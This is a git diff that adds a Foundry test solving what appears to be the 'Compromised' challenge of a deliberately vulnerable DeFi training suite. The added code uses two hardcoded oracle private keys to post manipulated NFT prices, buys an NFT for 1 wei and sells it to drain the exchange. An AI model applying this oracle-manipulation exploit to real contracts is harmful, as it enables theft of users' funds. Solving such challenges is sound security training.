@@ -5,6 +5,7 @@ pragma solidity =0.8.25;
 import {Test, console} from "forge-std/Test.sol";
 import {VmSafe} from "forge-std/Vm.sol";
 
+
 import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
 import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
 import {Exchange} from "../../src/compromised/Exchange.sol";
@@ -75,7 +76,51 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
+        // Get both private keys from the decoded hex in README
+        uint256 privateKey1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
+        uint256 privateKey2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;
         
+        address signer1 = vm.addr(privateKey1);
+        address signer2 = vm.addr(privateKey2);
+
+        // Step 1: Set price to 1 wei on BOTH signers (need 2 of 3 to control median)
+        vm.prank(signer1);
+        oracle.postPrice("DVNFT", 1 wei);
+        
+        vm.prank(signer2);
+        oracle.postPrice("DVNFT", 1 wei);
+
+        // Step 2: Buy NFT for 1 wei
+        vm.prank(player);
+        uint256 nftId = exchange.buyOne{value: 1 wei}();
+
+        // Step 3: Set price to exchange's current balance on BOTH signers
+        // This ensures sellOne pays out everything, leaving exchange with 0
+        uint256 balanceAfterBuy = address(exchange).balance;
+        vm.prank(signer1);
+        oracle.postPrice("DVNFT", balanceAfterBuy);
+        
+        vm.prank(signer2);
+        oracle.postPrice("DVNFT", balanceAfterBuy);
+
+        // Step 4: Approve NFT to exchange
+        vm.prank(player);
+        nft.approve(address(exchange), nftId);
+
+        // Step 5: Sell NFT for full exchange balance
+        vm.prank(player);
+        exchange.sellOne(nftId);
+
+        // Step 6: Transfer exchange's initial balance to recovery
+        vm.prank(player);
+        payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
+
+        // Step 7: Restore oracle price so final invariant matches initial state
+        vm.prank(signer1);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+
+        vm.prank(signer2);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
     }
 
     /**
